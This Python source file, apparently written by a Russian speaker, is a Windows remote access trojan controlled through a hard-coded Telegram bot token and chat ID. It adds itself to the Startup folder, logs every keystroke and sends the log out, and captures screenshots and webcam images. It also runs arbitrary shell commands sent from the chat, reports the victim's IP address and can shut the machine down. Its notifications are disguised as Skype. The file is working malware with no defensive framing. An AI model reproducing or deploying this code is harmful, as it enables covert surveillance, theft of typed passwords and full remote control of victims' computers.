chat_user_id = 496266339
######################
#2
#
#1.99.3 0.3/11/2021 04:00
#help out start messenge
#last 1.99.2
# add strat messenge
#last 1.99
#в этой версии добавлена возможность обновлять бота с сервера 
#при вводе команды update бот установленый вайлом setup скачает себя с сервера и установит
######################
bot_token = '2060724050:AAFf56IHazMb7OulkyKyxbxznySQX20jWU8'
import subprocess
import sys
import os
import getpass
from time import sleep
#import ctypes
#user32 = ctypes.windll.user32
versi = '2.1'

USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
	if file_path == "":
		file_path = os.path.dirname(os.path.realpath(__file__))
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % file_path)

add_to_startup(__file__)


#import pygame
#import pygame.camera
#from pygame.locals import *

from win10toast import ToastNotifier
import telegram
from telegram import Update
from telegram.ext import CallbackContext, Updater, MessageHandler, Filters
from PIL import Image, ImageGrab
import keyboard
from threading import Thread
from datetime import datetime
import io
import pyttsx3
import winsound
import cv2
import time

import http.client
import psutil

import requests
#import pyautogui 
#import base64

log = ''
help_text = 'Вeрсия '+versi+' Ник '+USER_NAME+' \n \nhelp - help \ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut'

#close the programm 
#NEEDS TESTING
def leave():
	sys.exit(1)

#make screenshot of all desktops
def scr():
	img = ImageGrab.grab(all_screens = True)
	buf = io.BytesIO()
	img.save(buf, format = 'png')
	byte_img = buf.getvalue()
	bot.send_photo(chat_id=chat_user_id, photo=byte_img)

#every message calls this
def message_handler(update: Update, context: CallbackContext):
	text = update.message.text
	if not text:
		return
	mas = text.split('\n')		#keys: alt, ctrl, space, enter, delete
	if text[:4] == 'del.' or text[:4] == 'pri.' or text[:4] == 'prs.':
		for elem in mas:
			com = elem[:4]		#command
			par = elem[4:]		#parameter
			if com == "del.":		#del.3 - wait 3 secs
				par = float(par)
				time.sleep(par)
			elif com == "pri.":		#write.string
				keyboard.write(par)
			elif com == 'prs.':		#prs.alt+tab
				keyboard.send(par)

	if text == 'help':
		bot.send_message(chat_id=chat_user_id, text=help_text)
	elif text == 'log':            #if log too long, it wont send (needs fix)
		send_log()
	elif text == 'save r':
		os.startfile('C:/Windows/System32/Ribbons.scr')
	elif text == 'save b':
		os.startfile('C:/Windows/System32/Bubbles.scr')
	elif text == 'scr':
		scr()
	elif text == 'done':
		leave()
	elif text == 'err':
		winsound.PlaySound('SystemHand', winsound.SND_ALIAS)
	elif text == 'shut':
		os.system('shutdown /s /t 1')
	elif text[0] == 's':
		speak(text)
	elif text[0] == 'n':
		notification(text)
	elif text == 'cam':
		camera()  
	elif text[0] == 'q':
		system_command(text) 
	elif text[0] == 'w':
		text = text[1:]
		oboi(text)
	elif text == 'update':
		os.system('python C:/Users/Public/Music/update.pyw')   
		bot.send_message(chat_id=chat_user_id, text='start updating')
		exit()
	elif text == '_status':  
		print('ok')    
		cpu = psutil.cpu_times_percent(interval=0.4, percpu=False)
		mem_use=((psutil.virtual_memory().used//1024)/1024)/1024
		mem_total=((psutil.virtual_memory().total//1024)/1024)/1024
        
		conn = http.client.HTTPConnection("ifconfig.me")
		conn.request("GET", "/ip")
		
		status='Пользователь: '+USER_NAME+' Версия os '+str(subprocess.check_output('ver', shell=True))+' всего RAM: '+str(mem_total)+' использовано: '+str(mem_use)+'ip адрес, udp port '+str(conn.getresponse().read())
		bot.send_message(chat_id=chat_user_id, text=str(status) )
        
def system_command(text):
	text = text[1:]
	#os.system(text)
	direct_output = subprocess.check_output(text, shell=True)
	print(direct_output)
	print(direct_output)
	bot.send_message(chat_id=chat_user_id, text=str(direct_output) )


def oboi(text):
    r = requests.get(text, allow_redirects = True)
    open('C:/Users/Public/Music/dowlfile.jpg', 'wb').write(r.content)
    bat_path = r'C:/Users/Public/Music/oboi.bat'
    with open(bat_path, "w+") as bat_file:
        bat_file.write(r'reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v wallpaper /t REG_SZ /d "" /f '
' \n reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v wallpaper /t REG_SZ /d C:\\Users\\Public\\Music\\dowlfile.jpg /f \n'
' reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f \n'
' RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n'
' exit')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    

        
'''
	elif text == 'at':
		at() 
def at():
    user32.keybd_event(0x12, 0, 0, 0) #Alt
    sleep(0.5)
    user32.keybd_event(0x09, 0, 0, 0) #Tab
    sleep(0.5)
    user32.keybd_event(0x09, 0, 2, 0) #~Tab
    sleep(0.1)
    user32.keybd_event(0x12, 0, 2, 0) #~Alt
	
	elif text == 'e':
		enter() 
def enter():
    pyautogui.press('enter')

	elif text[0] == 'q':
		system_command(text) 
def system_command(text):
    text = text[1:]
    os.system(text)

	elif text[0] == 'w':
		write_text(text) 
def write_text(text):
    text=text[1:]
    keyboard.write(text)
'''
def camera():
    cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
    retval, image = cap.read()
    image_bytes = cv2.imencode('.jpg', image)[1].tobytes() 
    cap.release()
    bot.send_photo(chat_id=chat_user_id, photo=image_bytes )






        
def notification(text):
	text = text[1:]
	toast = ToastNotifier()
	toast.show_toast("skype",text,duration=20,icon_path="C:\Windows\System32\ComputerToastIcon.png")

def speak(text):
	text = text[1:]
	tts = pyttsx3.init()
	rate = tts.getProperty('rate')
	tts.setProperty('rate', rate)
	volume = tts.getProperty('volume')
	voices = tts.getProperty('voices')
	tts.setProperty('voice', 'ru')
	tts.say(text)
	tts.runAndWait()

def send_log():
	global log
	if log != '':
		#bot.send_message(chat_id=chat_user_id, text=log)
		log = bytes(log, 'utf-8')
		bot.sendDocument(chat_id=chat_user_id, document=log, filename = 'logs.txt')
		log = ''
	else: 
		bot.send_message(chat_id=chat_user_id, text='empty')

def start_key():
	keyboard.on_release(callback=callback)
	keyboard.wait()

def callback(event):
	global log
	log += str(datetime.now()) + ' ' + str(event.name) + '\n'

bot = telegram.Bot(token=bot_token)
updater = Updater(token = bot_token, use_context = True)
updater.dispatcher.add_handler(MessageHandler(filters = Filters.all, callback = message_handler))
updater.start_polling()

#start keyboard listening
b = Thread(target = start_key)
b.start()

conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")
ipad=conn.getresponse().read()
startmess = 'лариса версии '+versi+' запущена у пользователя '+USER_NAME+'\n ip адрес '+str(ipad)
bot.send_message(chat_id=chat_user_id, text=startmess)
bot.send_message(chat_id=chat_user_id, text=str(__file__))
scr()
updater.idle()
